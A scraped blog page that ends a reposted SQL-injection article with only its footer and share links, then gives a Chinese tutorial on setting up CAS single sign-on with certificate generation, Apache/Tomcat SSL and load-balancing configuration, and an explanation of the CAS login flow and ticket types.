<li>3 <img src="" alt="">
愤怒</li>
<li>9 <img src="" alt="">
杯具</li>
<li>18 <img src="" alt="">
无聊</li>
<li>7 <img src="" alt="">
高兴</li>
<li>17 <img src="" alt="">
支持</li>
<li>83 <img src="" alt="">
超赞</li>
</ul>
<p>分享到：  <a href=""> </a> <a href="http://v.t.sina.com.cn/share/share.php?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;appkey=3172366919&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到新浪微博" target="_blank"> </a> <a href="http://www.douban.com/recommend/?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到豆瓣" target="_blank"> </a> <a href="http://share.renren.com/share/buttonshare.do?link=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到人人" target="_blank"> </a> <a href="http://www.kaixin001.com/repaste/share.php?rtitle=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0&amp;rurl=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;rcontent=" title="分享到开心网" target="_blank"> </a> <a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html" title="分享到QQ空间" target="_blank"> </a>
最新资讯</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2013/0502/13421.html" target="_blank">PHP闭包（Closure）初探</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13419.html" target="_blank">传 iOS 7 采用扁平化设计：颠覆拟物理念</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13418.html" target="_blank">创业失败后如何找工作</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13416.html" target="_blank">程序员的时间都去了哪儿？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13413.html" target="_blank">互联网 DBA 需要做那些事</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13412.html" target="_blank">Google 眼镜的核心代码</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13411.html" target="_blank">谷歌眼镜已被越狱：或削弱谷歌对用户的控制</a></li>
</ul>
<p>热门内容</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/it/2013/0107/11895.html" title="2013年1月编程语言排行榜" target="_blank">2013年1月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0427/13409.html" title="Ubuntu 13.04 正式版发布" target="_blank">Ubuntu 13.04 正式版发布</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2011/1118/9311.html" title="百度地图推出卫星地图" target="_blank">百度地图推出卫星地图</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2009/0408/14.html" title="十天学会PHP和MYSQL视频教程篇" target="_blank">十天学会PHP和MYSQL视频教程篇</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0426/13402.html" title="如何做一个真正牛X 的开源项目" target="_blank">如何做一个真正牛X 的开源项目</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0408/13335.html" title="2013年4月编程语言排行榜" target="_blank">2013年4月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2010/0514/4515.html" title="使用方正字体侵权索赔过亿" target="_blank">使用方正字体侵权索赔过亿</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" title="如何组织大型JavaScript应用中的代码？" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
</ul>
<p><strong>热点推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0610/4712.html" title="教你如何成为PHP高手?" target="_blank">教你如何成为PHP高手?</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0114/309.html" title="PHP导入导出Excel方法" target="_blank">PHP导入导出Excel方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2011/0406/7873.html" title="Redis 的安装配置介绍" target="_blank">Redis 的安装配置介绍</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0830/3245.html" title="数据库三范式，轻松理解" target="_blank">数据库三范式，轻松理解</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0905/3268.html" title="PHP网站开发方案（开发新人必读）" target="_blank">PHP网站开发方案（开发新人必读）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0930/3362.html" title="PHP面向对象编程专题（附视频教程）" target="_blank">PHP面向对象编程专题（附视频教程）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/1101/6727.html" title="php中使用exec,system等函数调用系统命令" target="_blank">php中使用exec,system等函数调用系</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0830/5346.html" title="SVN入门及配置使用" target="_blank">SVN入门及配置使用</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0721/3087.html" title="php excel类 ，phpExcel使用方法介绍" target="_blank">php excel类 ，phpExcel使用方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0826/5308.html" title="完美解决failed to open stream: HTTP request failed!" target="_blank">完美解决failed to open stream</a>
<strong>广告赞助商</strong> <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">投放</a></li>
</ul>
<p><strong>最新视频推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/html/jiaocheng/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0422/9129.html" target="_blank">［第77讲］新浪微博开放平台 -新</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0415/9128.html" target="_blank">［第76讲］微信公共平台 - 平台</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0407/9127.html" target="_blank">［第75讲］微信公共平台 - 开放</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9125.html" target="_blank">［第74讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9124.html" target="_blank">［第73讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9123.html" target="_blank">［第72讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9122.html" target="_blank">［第71讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9121.html" target="_blank">［第70讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9120.html" target="_blank">［第69讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9119.html" target="_blank">［第68讲］thinkphp 3.1.2 系列</a>
-
<a href="http://www.php100.com/cms/com/" target="_blank">关于我们</a> | <a href="http://www.php100.com/cms/com/buddy.php" target="_blank">管理团队</a> | <a href="">网站律师</a> | <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">广告服务</a> | <a href="http://www.php100.com/cms/com/intome.php" target="_blank">投稿指南</a> | <a href="http://bbs.php100.com/thread-htm-fid-14.html" target="_blank">提建议</a> | <a href="http://www.php100.com/plus/flink.php" target="_blank">友情链接</a> | <a href="http://www.php100.com/plus/flink_add.php" target="_blank">申请加入</a> | <a href="http://www.php100.com/data/sitemap.html" target="_blank">网站地图</a></li>
</ul>
<p>Copyright (C) 2007-2011 PHP100.com, All Rights Reserved 版权所有 <a href="http://php100.com/go.php?url=http://www.php100.net/" target="_blank">上海创恩信息技术有限公司</a>. 沪ICP备08100465号
地址:上海徐汇区零陵路585号 爱邦大厦26H座 传真(FAX):021-61190281 电话(Tel):021-61190282
PHP100 Website Powered by PHPCMS. For PHP100. 服务器维护：阿里巴巴-阿里云</p>
<p><a href="http://www.cnzz.com/stat/website.php?web_id=1668579" title="站长统计" target="_blank">站长统计</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/SQL注入/">SQL注入</a></li></span></span> | <span class="tags">Tagged <a href="/tags/SQL注入/" class="label label-primary">SQL注入</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/">cas改造随笔 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="cas-horus-">cas改造随笔 - horus - 博客园</h1>
<p><a href=""></a></p>
<p><a href="http://www.cnblogs.com/hellowood/" target="_blank">hello wood</a>
<a href="http://www.cnblogs.com/" target="_blank">博客园</a>   <a href="http://www.cnblogs.com/hellowood/" target="_blank">首页</a>   <a href="http://space.cnblogs.com/" target="_blank">社区</a>   <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx?opt=1" target="_blank">新随笔</a>   <a href="http://space.cnblogs.com/msg/send/horus" target="_blank">联系</a>   <a href="http://www.cnblogs.com/hellowood/rss" target="_blank">订阅</a><a href="http://www.cnblogs.com/hellowood/rss" target="_blank"><img src="" alt="订阅"></a>   <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx" target="_blank">管理</a></p>
<p>随笔-9  评论-5  文章-1  trackbacks-0</p>
<h1 id="-cas-http-www-cnblogs-com-hellowood-archive-2010-08-05-1793364-html-"><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html" target="_blank">cas改造随笔</a></h1>
<p>Sso doc</p>
<p>关键字：</p>
<p>sso域名：cas.server.com</p>
<p>登陆地址（spring web flow）：<a href="https://cas.800jit.com/cas/login" target="_blank"><a href="https://cas.800jit.com/cas/login">https://cas.800jit.com/cas/login</a></a></p>
<p>登陆地址（直接）：<a href="https://cas.800jit.com/cas/directLogin" target="_blank"><a href="https://cas.800jit.com/cas/directLogin">https://cas.800jit.com/cas/directLogin</a></a></p>
<p>退出地址：<a href="https://cas.800jit.com/cas/logout" target="_blank"><a href="https://cas.800jit.com/cas/logout">https://cas.800jit.com/cas/logout</a></a></p>
<p>语言参数：locale=zh_CN，locale=en</p>
<h1 id="-">环境篇</h1>
<p> <img src="" alt=""></p>
<h2 id="-">一、所需软件</h2>
<p>Jdk：jdk1.6.0_13</p>
<p>Apache：httpd-2.2.15-win32-x86-openssl-0.9.8m-r2</p>
<p>Tomcat：apache-tomcat-6.0.10</p>
<p>jks2pfx：证书导出工具<a href="http://www.myssl.cn/download/jks2pfx.zip" target="_blank"><a href="http://www.myssl.cn/download/jks2pfx.zip">http://www.myssl.cn/download/jks2pfx.zip</a></a></p>
<p>memcache：memcached-1.2.1-win32（需要memcache集群环境）</p>
<h2 id="-">二、安全证书生成</h2>
<p>1、<strong>keytool</strong></p>
<p>Apache、tomcat、jdk需要使用安全证书，进windows command窗口生成证书，命令如下：</p>
<p>--生成证书库</p>
<p>keytool -genkey -alias 800jit -keyalg RSA -keystore d:/cert/800jitkey</p>
<p>--从证书库中到处证书</p>
<p>keytool -export -file d:/cert/800jit.crt -alias 800jit -keystore d:/cert/800jitkey</p>
<p>--把证书导入jdk的证书库</p>
<p>keytool -import -keystore d: /jdk1.6.0_13/jre/lib/security/cacerts -file d:/cert/800jit.crt -alias 800jit</p>
<p>--生成Apache服务器的SSL连接需要配置私钥文件和证书文件</p>
<p>D:\casex\jks2pfx&gt;JKS2PFX.bat .keystore 800jitkey tomcat server_dev00</p>
<p>生成的server_dev00.crt，server_dev00.key放到D:/work/Apache2.2/conf/</p>
<p><strong>2**</strong>、openssl**</p>
<p>openssl req -config ..\conf\openssl.cnf -new -out olymtech.csr</p>
<p>openssl rsa -in privkey.pem -out olymtech.key</p>
<p>openssl x509 -in olymtech.csr -out olymtech.cert -req -signkey olymtech.key -days 3650</p>
<p>openssl x509 -in olymtech.cert -out olymtech.der.crt -outform DER</p>
<p>keytool -import -keystore d:/work/jdk1.6.0_13/jre/lib/security/cacerts -file d:/casex/ssl/olymtech.crt -alias olymtech</p>
<p>keytool -import -keystore D:/casex/800jitkey -file D:/casex/cas-doc/ssl/olymtech.crt -alias olymtech</p>
<h2 id="-apache-">三、Apache配置</h2>
<p>Apache+ssl+虚拟机</p>
<p>--修改http.conf文件</p>
<p>取消注释 LoadModule ssl_module modules/mod_ssl.so</p>
<p>取消注释 Include conf/extra/httpd-ssl.conf</p>
<p>取消注释 Include conf/extra/httpd-vhosts.conf</p>
<p>ProxyPass /cas  balancer://cas lbmethod=bytraffic stickysession=jsessionid</p>
<proxy balancer://cas/>

    BalancerMember ajp://192.168.1.190:10009/cas  loadfactor=1 route=jvm1

    BalancerMember ajp://192.168.1.190:8009/cas  loadfactor=1 route=jvm2

</proxy>



<p>--修改httpd-ssl.conf</p>
<p>在<VirtualHost _default_:443>下增加</p>
<p>ProxyPass /cas  balancer://cas/ lbmethod=bytraffic stickysession=jsessionid</p>
<p>ProxyPassReverse /cas balancer://cas/</p>
<p>SSLProxyEngine On</p>
<p>修改</p>
<p>SSLCertificateFile &quot;D:/work/Apache2.2/conf/server_dev00.crt&quot;</p>
<p>SSLCertificateKeyFile &quot;D:/work/Apache2.2/conf/server_dev00.key&quot;</p>
<p>--修改httpd-vhosts.conf</p>
<p>在<VirtualHost /*:80>下增加</p>
<p>ProxyPass /cas  balancer://cas/ lbmethod=bytraffic stickysession=jsessionid</p>
<p>ProxyPassReverse /cas balancer://cas/</p>
<h2 id="-tomcat-">四、Tomcat配置</h2>
<p>修改server.xml</p>
<p>--配置ssl</p>
<Connector port="8443" protocol="HTTP/1.1" SSLEnabled="true"

               maxThreads="150" scheme="https" secure="true"

               clientAuth="false" sslProtocol="TLS"

                        keystoreFile="d:/work/apache-tomcat-6.0.10/conf/800jitkey"

                        keystorePass="111111" />



<h2 id="-session-tomcat-">五、session共享（Tomcat）</h2>
<h2 id="-memcache-">六、memcache集群</h2>
<h1 id="cas-server-">CAS SERVER篇</h1>
<h2 id="-cas-">一、CAS 原理介绍</h2>
<p> <img src="" alt=""></p>
<p>访问流程图</p>
<p><strong>主要原理：</strong>用户第一次访问一个CAS 服务的客户web 应用时（访问URL ：<a href="http://192.168.1.90:8081/web1" target="_blank"><a href="http://192.168.1.90:8081/web1">http://192.168.1.90:8081/web1</a></a> ），部署在客户web 应用的cas AuthenticationFilter ，会截获此请求，生成service 参数，然后redirect 到CAS 服务的login 接口，url为<a href="https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F" target="_blank"><a href="https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F">https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F</a></a> ，认证成功后，CAS 服务器会生成认证cookie ，写入浏览器，同时将cookie 缓存到服务器本地，CAS 服务器还会根据service 参数生成ticket,ticket 会保存到服务器，也会加在url 后面，然后将请求redirect 回客户web 应用，url 为<a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20" target="_blank"><a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20">http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20</a></a> 。这时客户端的AuthenticationFilter 看到ticket 参数后，会跳过，由其后面的TicketValidationFilter 处理，TicketValidationFilter 会利用httpclient 工具访问cas 服务的/serviceValidate 接口, 将ticket 、service 都传到此接口，由此接口验证ticket 的有效性，TicketValidationFilter 如果得到验证成功的消息，就会把用户信息写入web 应用的session里。至此为止，SSO 会话就建立起来了，以后用户在同一浏览器里访问此web 应用时，AuthenticationFilter 会在session 里读取到用户信息，所以就不会去CAS 认证，如果在此浏览器里访问别的web 应用时，AuthenticationFilter 在session 里读取不到用户信息，会去CAS 的login 接口认证，但这时CAS 会读取到浏览器传来的cookie ，所以CAS 不会要求用户去登录页面登录，只是会根据service 参数生成一个ticket ，然后再和web 应用做一个验证ticket 的交互。</p>
<h2 id="-cas-">二、CAS 服务端的处理逻辑</h2>
<p>CAS 服务端总共对外定义了9 个接口，客户端通过访问这9 个接口与服务端交互，这9个接口为：
接口</p>
<p>说明</p>
<p>备注 /login</p>
<p>认证接口</p>
<p>  /logout</p>
<p>退出接口，负责销毁认证cookie</p>
<p>  /validate</p>
<p>验证ticket 用的接口，CAS1.0 定义</p>
<p>  /serviceValidate</p>
<p>验证ticket 用的接口，CAS2.0 定义，返回xml 格式的数据</p>
<p>  /proxy</p>
<p>支持代理认证功能的接口</p>
<p>  /proxyValidate</p>
<p>支持代理认证功能的接口</p>
<p>  /CentralAuthenticationService</p>
<p>用于和远程的web services 交互</p>
<p>  /remoteLogin（新增）</p>
<p>认证接口</p>
<p>  /directLogin（新增）</p>
<p>认证接口</p>
<p>详细说明：</p>
<p> <strong>/login:</strong></p>
<p>登录流程这部分要考虑到不同种类用户凭证的获取方案，以及客户应用传来的service 、gateway 、renew 参数的不同取值组合，CAS 为了实现流程的高度可配置性，采用了Spring Web Flow 技术。通过CAS 发布包里的login-webflow.xml 、cas-servlet.xml 、applicationContext.xml 这3 个文件，找出 了登录有关的所有组件，画出处理流程图。</p>
<p> <img src="" alt=""></p>
<p>CAS 默认的登录处理流程</p>
<p> <img src="" alt=""></p>
<p>第一次访问Web 应用的流程走向</p>
<p> <img src="" alt=""></p>
<p>已经登录web1 后，访问web1 的资源（web1 没有启动session ），或访问web2 的资源</p>
<p>注：</p>
<p>1 ： InitialFlowSetupAction: 是流程的入口。用 request.getContextPath() 的值来设置 cookie 的 Path 值， Cookie 的 path 值是在配置文件里定义的，但这个 Action 负责将 request.getContextPath() 的值设置为 Cookie 的 path 值，这是在 cas 部署环境改变的情况下，灵活地设置 cookie path 的方式；把 cookie 的值以及 service 参数的值放入 requestContext 的 flowscope 里。</p>
<p>2 ： GenerateServiceTicketAction 此 Action 负责根据 service 、 GTC cookie 值生成 ServiceTicket 对象， ServiceTicket 的 ID 就是返回给客户应用的 ticket 参数，如果成功创建 ServiceTicket ，则转发到 WarnAction ，如果创建失败，且 gateway 参数为 true ，则直接redirect 到客户应用， 否则则需要重新认证。</p>
<p>3 ： viewLoginForm 这是登录页面， CAS 在此收集用户凭证。 CAS 提供的默认实现是 /WEB-INF/view/jsp/simple/ui/casLoginView.jsp 。</p>
<p>4 ： bindAndValidate 对应 AuthenticationViaFormAction 的 doBind 方法，该方法负责搜集登录页面上用户录入的凭证信息（用户名、密码等），然后把这些信息封装到 CAS 内部的 Credentials 对象中。用户在 casLoginView.jsp 页面上点击提交后，会触发此方法。</p>
<p>5:submit   对应 AuthenticationViaFormAction 的 submit 方法 , 如果 doBind 方法成功执行完， 则触发 submit 方法，此方法负责调用centralAuthenticationService 的      grantServiceTicket 方法，完成认证工作，如果认证成功，则生成 TicketGrantingTicket 对象，放在缓存里， TicketGrantingTicket 的 ID 就是 TGC Cookie 的 value 值。</p>
<p>6 ： warn  CAS 提供了一个功能：用户在一个 web 应用中跳到另一个 web 应用时， CAS 可以跳转到一个提示页面，该页面提示用户要离开一个应用进入另一个应用，可以让用户自己选择。用户在登录页面 viewLoginForm 上选中了 id=”warn” 的复选框，才能开启这个功能。</p>
<p>WarnAction 就检查用户有没有开启这个功能，如果开启了，则转发到showWarnView, 如果没开启，则直接redirect 到客户应用。</p>
<p>7 ：SendTicketGrantingTicketAction 此Action 负责为response 生成TGC Cookie ，cookie 的值就是 AuthenticationViaFormAction 的submit 方法生成的 TicketGrantingTicket 对象的 ID 。</p>
<p>8 ： viewGenerateLoginSuccess 这是 CAS 的认证成功页面。</p>
<p><strong>/logout:</strong> （ 对应实现类 org.jasig.cas.web.LogoutController ）</p>
<p>处理逻辑：   </p>
<pre><code>    1) removeCookie

   2) 在服务端删除TicketGrantingTicket 对象（此对象封装了cookie 的value 值）

   3 ）redirect 到退出页面，有2 种选择：

      if(LogoutController 的followServiceRedirects 属性为true 值，且url 里的service 参数非空){

            redirect 到 sevice 参数标识的url

         }

      else{

         redirect 到内置的casLogoutView （cas/WEB-INF/view/jsp/default/ui/casLogoutView.jsp ），如果url 里有url 参数，则此url 参数标识的链接会显示在casLogoutView 页面上。

       }
</code></pre><p><strong>/serviceValidate: </strong>（对应实现类 org.jasig.cas.web.ServiceValidateController ）</p>
<p> 处理逻辑：  </p>
<p>  如果service 参数为空或ticket 参数为空，则转发到failureView （/WEB-INF/view/jsp/default/protocol/2.0/casServiceValidationFailure.jsp ）</p>
<pre><code>验证ticket 。以ticket 为参数，去缓存里找ServiceTicketImpl 对象，如果能找到，且没有过期，且ServiceTicketImpl 对象对应的service 属性和service 参数对应，则验证通过，验证通过后，请求转发至casServiceSuccessView （cas/WEB-INF/view/jsp/default/protocol/2.0/casServiceValidationSuccess.jsp ），验证不通过，则转发到failureView 。
</code></pre><h2 id="-">三、认证相关的概念及流程</h2>
<p>概念</p>
<ul>
<li><strong>Credentials**</strong> **用户提供的用于登录用的凭据信息，如用户名/ 密码、证书、IP 地址、Cookie 值等。比如 UsernamePasswordCredentials ，封装的是用户名和密码。CAS 进行认证的第一步，就是把从UI 或request 对象里取到的用户凭据封装成Credentials 对象，然后交给认证管理器去认证。</li>
<li><strong>AuthenticationHandler**</strong> **认证Handler, 每种AuthenticationHandler 只能处理一种Credentials ，如AbstractUsernamePasswordAuthenticationHandler 只负责处理 U sernamePasswordCredentials 。</li>
<li><strong>Principal</strong> 封装用户标识，比如 SimplePrincipal, 只是封装了用户名。认证成功后， credentialsToPrincipalResolvers 负责由Credentials 生成 Principal 对象。</li>
<li><strong>CredentialsToPrincipalResolvers**</strong> **负责由 Credentials 生成 Principal 对象，每种 CredentialsToPrincipalResolvers 只处理 一种Credentials ，比如 UsernamePasswordCredentialsToPrincipalResolver 负责从 U sernamePasswordCredentials 中取出用户名，然后将其赋给生成的 SimplePrincipal 的 ID 属性。</li>
<li><strong>AuthenticationMetaDataPopulators</strong> 负责将 Credentials 的一些属性赋值给 Authentication 的 attributes 属性。</li>
<li><strong>Authentication</strong>   Authentication是认证管理器的最终处理结果， Authentication 封装了 Principal ，认证时间，及其他一些属性（可能来自 Credentials ）。</li>
<li><strong>AuthenticationManager</strong> 认证管理器得到 Credentials 对象后，负责调度AuthenticationHandler 去完成认证工作，最后返回的结果是 Authentication 对象。</li>
<li><strong>CentralAuthenticationService**</strong> <strong> CAS 的服务类，对 Web 层提供了一些方法。该类还负责调用 AuthenticationManager 完成认证逻辑</strong>。**</li>
</ul>
<p>序列图</p>
<p> <img src="" alt=""></p>
<p>类图</p>
<p> <img src="" alt=""></p>
<h2 id="-ticket-http-zhenkm0507-javaeye-com-blog-546805-">四、<a href="http://zhenkm0507.javaeye.com/blog/546805" target="_blank">Ticket介绍</a></h2>
<p>CAS的核心就是其Ticket，及其在Ticket之上的一系列处理操作。CAS的主要票据有TGT、ST、PGT、PGTIOU、PT，其中TGT、ST是CAS1.0协议中就有的票据，PGT、PGTIOU、PT是CAS2.0协议中有的票据。</p>
<h3 id="-">一 名词解释</h3>
<ul>
<li>TGT（Ticket Grangting Ticket）</li>
</ul>
<p>TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</p>
<ul>
<li>ST（Service Ticket）</li>
</ul>
<p>ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</p>
<ul>
<li>PGT（Proxy Granting Ticket）</li>
</ul>
<p>Proxy Service的代理凭据。用户通过CAS成功登录某一Proxy Service后，CAS生成一个PGT对象，缓存在CAS本地，同时将PGT的值（一个UUID字符串）回传给Proxy Service，并保存在Proxy Service里。Proxy Service拿到PGT后，就可以为Target Service（back-end service）做代理，为其申请PT。</p>
<ul>
<li>PGTIOU（Proxy Granting Ticket IOU）</li>
</ul>
<p>PGTIOU是CAS协议中定义的一种附加票据，它增强了传输、获取PGT的安全性。
PGT的传输与获取的过程：Proxy Service调用CAS的serviceValidate接口验证ST成功后，CAS首先会访问pgtUrl指向的https url，将生成的 PGT及PGTIOU传输给proxy service，proxy service会以PGTIOU为key，PGT为value，将其存储在Map中；然后CAS会生成验证ST成功的xml消息，返回给Proxy Service，xml消息中含有PGTIOU，proxy service收到Xml消息后，会从中解析出PGTIOU的值，然后以其为key，在map中找出PGT的值，赋值给代表用户信息的Assertion对象的pgtId，同时在map中将其删除。</p>
<ul>
<li>PT（Proxy Ticket）</li>
</ul>
<p>PT是用户访问Target Service（back-end service）的票据。如果用户访问的是一个Web应用，则Web应用会要求浏览器提供ST，浏览器就会用cookie去CAS获取一个ST，然后就可以访问这个Web应用了。如果用户访问的不是一个Web应用，而是一个C/S结构的应用，因为C/S结构的应用得不到cookie，所以用户不能自己去CAS获取ST，而是通过访问proxy service的接口，凭借proxy service的PGT去获取一个PT，然后才能访问到此应用。</p>
<h3 id="-">二 代码解析</h3>
<p> <img src="" alt=""></p>
<p>CAS Ticket类图</p>
<ul>
<li>TicketGrantingTicket 的 grantServiceTicket方法</li>
</ul>
<p>方法声明：public synchronized ServiceTicket grantServiceTicket(final String id,final Service service, final ExpirationPolicy expirationPolicy, final boolean credentialsProvided)</p>
<p>方法描述:</p>
<p> 1：生成SerivceTicketImpl</p>
<p> 2：更新属性：</p>
<p>this.previousLastTimeUsed = this.lastTimeUsed;</p>
<p>   this.lastTimeUsed = System.currentTimeMillis();</p>
<p>   this.countOfUses++;</p>
<p> 3：给service对象的principal属性赋值</p>
<p> 4：将service对象放入map services</p>
<ul>
<li>ServiceTicket 的 grantTicketGrantingTicket方法</li>
</ul>
<p>方法声明：</p>
<p>public TicketGrantingTicket grantTicketGrantingTicket(final String id, final Authentication authentication,final ExpirationPolicy expirationPolicy)</p>
<p>方法描述：在CAS3.3对CAS2.0协议的实现中，PGT是由ST签发的，调用的就是ServiceTicket的grantTicketGrantingTicket方法。方法返回的TicketGrantingTicket对象，表征的是一个PGT对象，其中的ticketGrantingTicket属性的值是签发ST的TGT对象。</p>
<ul>
<li>TicketGrantingTicket 的 expire方法</li>
</ul>
<p>方法声明：void expire()</p>
<p>方法描述：</p>
<p>在CAS的logout接口实现中，要调用TGT对象的expire方法，然后会在缓存中清除此TGT对象。</p>
<p>expire方法的内容：循环遍历 services 中的Service对象，调用其logoutOfService方法。具体Service实现类中的logoutOfService方法的实现，要通知具体的应用，客户要退出。</p>
<h3 id="-tgt-st-pgt-pt-">三、TGT、ST、PGT、PT关系</h3>
<p>1：ST是TGT签发的。用户在CAS上认证成功后，CAS生成TGT，用TGT签发一个ST，ST的ticketGrantingTicket属性值是TGT对象，然后把ST的值redirect到客户应用。</p>
